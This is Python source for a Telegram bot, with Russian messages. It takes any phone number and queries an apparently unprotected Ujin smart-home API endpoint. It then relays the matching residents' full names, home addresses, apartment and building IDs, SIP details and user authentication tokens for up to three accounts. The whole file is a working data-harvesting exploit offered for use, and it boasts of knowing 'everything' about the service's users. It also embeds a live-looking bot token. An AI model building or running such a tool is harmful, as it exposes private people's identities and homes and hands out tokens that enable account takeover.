import telebot
import requests

bot = telebot.TeleBot('5321021406:AAGFKeWH3wtTHXs7FVG44WbLLKYs84RAXkk')

@bot.message_handler(commands=['help'])
def description(message):
    bot.send_message(message.chat.id, "Я могу вывести информацию о пользователях Ujin по номеру телефона")


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Привет ' + message.from_user.first_name + ', я знаю все про пользоватей Ujin)))')


@bot.message_handler(func=lambda message: True)
def give_number(message):
    try:
        try:

            number = message.text
            request_info_user = requests.get(
                f'https://api-product.mysmartflat.ru/api/script/getuserdatafromphonenumber/?phone={number}')
            response = request_info_user
            response = response.json()
            provider_info = response[0]["provider"]
            adres = response[0]["data"]["user"]["apartment"][0]["title"]
            user_name = response[0]["data"]["user"]["user_fullname"]
            user_token = response[0]["data"]["user"]["apartment"][0]["user_token"]
            number_info = response[0]["data"]["user"]["user_phone"]
            appartment_id = response[0]["data"]["user"]["apartment"][0]["id"]
            sip_info = response[0]["data"]["user"]["apartment"][0]["sip"]
            complex_id = response[0]["data"]["user"]["apartment"][0]["complex_id"]
            building_id = response[0]["data"]["user"]["apartment"][0]["building_id"]
            bot.send_message(message.chat.id, f'Первый аккаунт\nПровайдер: {provider_info}\nАдрес: {adres}\nФио: {user_name}\nТокен пользователя: {user_token}\nНомер: {number_info}\nAppartment_id: {appartment_id}\nSip: {sip_info}\nComplex_id: {complex_id}\nBuilding_id: {building_id}')
        except IndexError:
            bot.send_message(message.chat.id, '!')

        try:
            adre = response[0]["data"]["user"]["apartment"][1]["title"]
            appartment_id_1 = response[0]["data"]["user"]["apartment"][1]["id"]
            sip_info_2= response[0]["data"]["user"]["apartment"][1]["sip"]
            complex_id_2 = response[0]["data"]["user"]["apartment"][1]["complex_id"]
            building_id_2 = response[0]["data"]["user"]["apartment"][1]["building_id"]
            bot.send_message(message.chat.id, f'Квартира 2 аккаунт 1\nАдрес: {adre}\napp_id квартиры №2: {appartment_id_1}\nSip квартира №2: {sip_info_2}\nComplex_id_2: {complex_id_2}\nBuilding_id_2: {building_id_2}')

            adress_5 = response[0]["data"]["user"]["apartment"][2]["title"]
            appartment_id_5 = response[0]["data"]["user"]["apartment"][2]["id"]
            sip_info_5 = response[0]["data"]["user"]["apartment"][2]["sip"]
            complex_id_5 = response[0]["data"]["user"]["apartment"][2]["complex_id"]
            building_id_5 = response[0]["data"]["user"]["apartment"][2]["building_id"]
            bot.send_message(message.chat.id,
                             f'Квартира 3 аккаунт 1:\nАдрес: {adress_5}\napp_id квартиры №2: {appartment_id_5}\nSip квартира №2: {sip_info_5}\nComplex_id_2: {complex_id_5}\nBuilding_id_2: {building_id_5}')


        except IndexError:
            bot.send_message(message.chat.id, 'Больше квартир у аккаунта 1 нет')



        try:
            provider_info_2 = response[1]["provider"]
            adres_2 = response[1]["data"]["user"]["apartment"][0]["title"]
            user_name_2 = response[1]["data"]["user"]["user_fullname"]
            user_token_2 = response[1]["data"]["user"]["apartment"][0]["user_token"]
            number_info_2 = response[1]["data"]["user"]["user_phone"]
            appartment_id_2 = response[1]["data"]["user"]["apartment"][0]["id"]
            sip_info_d = response[1]["data"]["user"]["apartment"][0]["sip"]
            complex_id_d = response[1]["data"]["user"]["apartment"][0]["complex_id"]
            building_id_d = response[1]["data"]["user"]["apartment"][0]["building_id"]
            bot.send_message(message.chat.id, f'Второй аккаунт\nПровайдер: {provider_info_2}\nАдрес: {adres_2}\nФио: {user_name_2}\nТокен пользователя: {user_token_2}\nНомер: {number_info_2}\nAppartment_id: {appartment_id_2}\nSip: {sip_info_d}\nComplex_id: {complex_id_d}\nBuilding_id: {building_id_d}')

        except IndexError:
            bot.send_message(message.chat.id, 'Больше аккаунтов нет')

        try:
            adress_3 = response[1]["data"]["user"]["apartment"][1]["title"]
            appartment_id_3 = response[1]["data"]["user"]["apartment"][1]["id"]
            sip_info_3 = response[1]["data"]["user"]["apartment"][1]["sip"]
            complex_id_3 = response[1]["data"]["user"]["apartment"][1]["complex_id"]
            building_id_3 = response[1]["data"]["user"]["apartment"][1]["building_id"]
            bot.send_message(message.chat.id, f'Квартира 2 аккаунт 2:\nАдрес: {adress_3}\napp_id квартиры №2: {appartment_id_3}\nSip квартира №2: {sip_info_3}\nComplex_id_2: {complex_id_3}\nBuilding_id_2: {building_id_3}')

            adress_4 = response[1]["data"]["user"]["apartment"][2]["title"]
            appartment_id_4 = response[1]["data"]["user"]["apartment"][2]["id"]
            sip_info_4 = response[1]["data"]["user"]["apartment"][2]["sip"]
            complex_id_4 = response[1]["data"]["user"]["apartment"][2]["complex_id"]
            building_id_4 = response[1]["data"]["user"]["apartment"][2]["building_id"]
            bot.send_message(message.chat.id,
                             f'Квартира 3 аккаунт 2:\nАдрес: {adress_4}\napp_id квартиры №2: {appartment_id_4}\nSip квартира №2: {sip_info_4}\nComplex_id_2: {complex_id_4}\nBuilding_id_2: {building_id_4}')

        except IndexError:
            bot.send_message(message.chat.id, "Больше квартир у аккаунта 2 нет")

        try:
            provider_info_2 = response[2]["provider"]
            adres_6 = response[2]["data"]["user"]["apartment"][0]["title"]
            user_name_2 = response[2]["data"]["user"]["user_fullname"]
            user_token_2 = response[2]["data"]["user"]["apartment"][0]["user_token"]
            number_info_2 = response[2]["data"]["user"]["user_phone"]
            appartment_id_6 = response[2]["data"]["user"]["apartment"][0]["id"]
            sip_info_d = response[2]["data"]["user"]["apartment"][0]["sip"]
            complex_id_d = response[2]["data"]["user"]["apartment"][0]["complex_id"]
            building_id_d = response[2]["data"]["user"]["apartment"][0]["building_id"]
            bot.send_message(message.chat.id,
                             f'Третий аккаунт\nПровайдер: {provider_info_2}\nАдрес: {adres_6}\nФио: {user_name_2}\nТокен пользователя: {user_token_2}\nНомер: {number_info_2}\nAppartment_id: {appartment_id_6}\nSip: {sip_info_d}\nComplex_id: {complex_id_d}\nBuilding_id: {building_id_d}')

        except IndexError:
            bot.send_message(message.chat.id, "Больше аккаунтов нет")

        try:
            adress_3 = response[2]["data"]["user"]["apartment"][1]["title"]
            appartment_id_3 = response[2]["data"]["user"]["apartment"][1]["id"]
            sip_info_3 = response[2]["data"]["user"]["apartment"][1]["sip"]
            complex_id_3 = response[2]["data"]["user"]["apartment"][1]["complex_id"]
            building_id_3 = response[2]["data"]["user"]["apartment"][1]["building_id"]
            bot.send_message(message.chat.id, f'Квартира 2 аккаунт 3:\nАдрес: {adress_3}\napp_id квартиры №2: {appartment_id_3}\nSip квартира №2: {sip_info_3}\nComplex_id_2: {complex_id_3}\nBuilding_id_2: {building_id_3}')

            adress_4 = response[2]["data"]["user"]["apartment"][2]["title"]
            appartment_id_4 = response[2]["data"]["user"]["apartment"][2]["id"]
            sip_info_4 = response[2]["data"]["user"]["apartment"][2]["sip"]
            complex_id_4 = response[2]["data"]["user"]["apartment"][2]["complex_id"]
            building_id_4 = response[2]["data"]["user"]["apartment"][2]["building_id"]
            bot.send_message(message.chat.id,
                             f'Квартира 3 аккаунт 3:\nАдрес: {adress_4}\napp_id квартиры №2: {appartment_id_4}\nSip квартира №2: {sip_info_4}\nComplex_id_2: {complex_id_4}\nBuilding_id_2: {building_id_4}')

        except IndexError:
            bot.send_message(message.chat.id, "Больше квартир у аккаунта 3 нет")


    except TypeError :
        bot.send_message(message.chat.id, 'Вы ввели не валидный номер или отвалился VPN на моем сервере')

    except KeyError:
        user_token_user =  response[0]["token"]
        bot.send_message(message.chat.id, f'Аккаунт, без кв(возможно, это коммерция)\nПровайдер: {provider_info}\nТокен: {user_token_user}')


bot.polling(none_stop=True)


